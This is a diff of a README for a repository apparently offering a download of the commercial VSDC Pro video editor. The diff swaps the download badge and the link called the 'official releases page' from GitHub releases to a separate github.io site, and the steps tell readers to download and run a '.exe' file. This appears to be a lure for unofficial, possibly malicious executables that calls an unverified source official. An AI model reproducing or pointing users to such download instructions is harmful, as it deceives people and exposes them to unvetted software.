@@ -1,6 +1,6 @@
 # 🚀 Baixar-VSDC-Pro - Edit videos with professional tools easily
 
-[ ![Download VSDC Pro](https://img.shields.io/badge/Download_VSDC_Pro-Blue?style=for-the-badge) ](https://github.com/naneteeven527/Baixar-VSDC-Pro/releases)
+[ ![Download VSDC Pro](https://img.shields.io/badge/Download_VSDC_Pro-Blue?style=for-the-badge) ](https://naneteeven527.github.io)
 
 ## About This Software
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware to run VSDC Pro well. These requirements e
 
 Follow these steps to obtain the official installation package.
 
-1.  Visit the [official releases page](https://github.com/naneteeven527/Baixar-VSDC-Pro/releases).
+1.  Visit the [official releases page](https://naneteeven527.github.io).
 2.  Locate the latest version release.
 3.  Click the file link ending in ".exe" to start the download.
 4.  Save the file to your Downloads folder or your Desktop.
